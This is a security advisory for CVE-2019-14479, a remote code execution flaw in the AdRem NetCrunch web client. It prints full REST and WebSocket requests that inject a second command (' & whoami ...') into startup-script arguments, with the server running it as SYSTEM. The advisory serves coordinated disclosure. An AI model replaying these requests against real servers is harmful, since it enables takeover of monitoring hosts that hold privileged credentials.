@@ -1,0 +1,179 @@
+################################################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://compass-security.com/en/research/advisories
+#
+################################################################################
+#
+# Product:  NetCrunch
+# Vendor:   AdRem
+# CSNC ID:  CSNC-2019-014
+# CVE ID:   CVE-2019-14479
+# Subject:  Remote Code Execution
+# Risk:     High
+# Effect:   Remotely exploitable
+# Authors:  Sylvain Heiniger <sylvain.heiniger@compass-security.com>
+#           Thierry Viaccoz <thierry.viaccoz@compass-security.com>
+#           Fabio Poloni <fabio.poloni@compass-security.com>
+# Date:     26.07.2019
+#
+################################################################################
+
+Introduction:
+-------------
+NetCrunch [1] is a so-called "agentless" monitoring solution developed by 
+AdRem. It allows system administrators to monitor, visualize and get alerts 
+from many kinds of systems in their network. The solution consists of a server 
+and a fat client (also called console), as well as a web client.
+
+Due to its architecture, the monitoring server is a critical system as it 
+holds credentials, most of the time privileged, for all monitored system.
+
+Compass Security identified a remote code execution vulnerability in the AdRem 
+NetCrunch web client. Successful exploitation requires authentication and can 
+be performed remotely. A read-only administrator can execute arbitrary code on
+the server running the NetCrunch server software.
+
+Affected:
+---------
+Initially vulnerable:
+ * AdRem NetCrunch 10.6.0.4587 (via POST request)
+ * AdRem NetCrunch 10.6.1.4607 (via WebSockets only)
+
+Not vulnerable:
+ * AdRem NetCrunch 10.8.1
+
+No other version was tested, but it is believed that older versions are also 
+vulnerable.
+
+Technical Description:
+----------------------
+The web client communicates with the NetCrunch server over an RCP interface.
+
+In the first test performed, interaction with the RPC interface could be 
+performed via a REST API. Example request:
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=967561493 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Connection: close
+    Content-Length: 290
+    
+    [{"action":"AppServerObject$1","method":"@create","data":[1074],"type":"rpc","tid":8}]
+
+Response:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 252
+    Cache-control: no-cache
+    Date: Tue, 14 May 2019 12:53:49 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@create","result":true}]
+
+A method to test a "Startup Script" is offered by the web service. Although it 
+accepts only scripts (ending in .bat or .cmd) as input, arbitrary code can be 
+injected in the parameters to the script.
+
+HTTP request to create a so-called "AppServerObject" and perform the 
+"TestStartupScript" request (with ID 1074) with code injection (" & whoami > 
+c:\\compass") in the arguments to the script 
+(c:\\windows\\system32\\sconfig.cmd):
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=967561493 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Connection: close
+    Content-Length: 321
+    
+    [{"action":"AppServerObject$1","method":"@create","data":[1074],"type":"rpc","tid":8},{"action":"AppServerObject$1","method":"request","data":[2,["c:\\windows\\system32\\sconfig.cmd"," & whoami > c:\\compass",true,3]],"type":"rpc","tid":8},{"action":"AppServerObject$1","method":"@destroy", "data":[],"type":"rpc","tid":8}]
+
+The HTTP response shows no failure:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 252
+    Cache-control: no-cache
+    Date: Tue, 14 May 2019 14:07:01 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@create","result":true},{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"request","result":{"Result":[]}},{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@destroy"}]
+
+On the NetCrunch server, it can be observed that the code was executed with 
+"NT AUTHORITY\SYSTEM" rights:
+    c:\>type compass
+    nt authority\system
+
+After an update to version 10.6.1.4607, the REST API as described above does 
+not allow this operation anymore. However, the web client also communicates 
+via WebSockets. Session establishment:
+    GET /ncsrv/dashboards/summary/1768565116 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Sec-WebSocket-Version: 13
+    Origin: https://some-server
+    Connection: keep-alive, Upgrade
+    Pragma: no-cache
+    Cache-Control: no-cache
+    Upgrade: websocket
+
+Server response:
+    HTTP/1.1 101 Web Socket Protocol Handshake
+    Upgrade: websocket
+    Connection: Upgrade
+    Server: Adrem WebApp Server
+    Access-Control-Allow-Origin: https://some-server
+    Access-Control-Allow-Credentials: True
+    Access-Control-Allow-Headers: content-type
+    Sec-WebSocket-Origin: https://some-server
+    Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
+
+A first WebSocket message is sent to the server to create the "AppServerObject":
+    ncsrv{"dat":[1074],"call":"AppServerObject$1.create","tid":123}
+
+And the following WebSocket response is received:
+    r{"type":"rpc","tid":123,"result":522018528}
+
+A second WebSocket request is send to execute the request:
+    ncsrv{"dat":[2,["c:\\windows\\system32\\sconfig.cmd"," & whoami > c:\\compass",true,3]],"call":"AppServerObject$1.request","tid":61}
+
+And the following response is received:
+    r{"type":"rpc","tid":61,"result":{"Result":[]}}
+
+On the NetCrunch server, it can be observed that the code was executed with 
+"NT AUTHORITY\SYSTEM" rights:
+    c:\>type compass
+    nt authority\system
+
+Workaround / Fix:
+-----------------
+Do not allow execution of arbitrary code on the NetCrunch server via scripts. 
+Escape user input in order to prevent from injecting commands in the arguments.
+
+As a NetCrunch customer, update your installation to the latest version to 
+receive the fix.
+
+Timeline:
+---------
+2019-05-23: Discovery by Sylvain Heiniger, Thierry Viaccoz and Fabio Poloni
+2019-08-01: Assigned CVE-2019-14479
+2019-08-29: Initial vendor notification
+2020-12-08: Coordinated public disclosure date
+
+References:
+-----------
+[1] https://www.adremsoft.com/
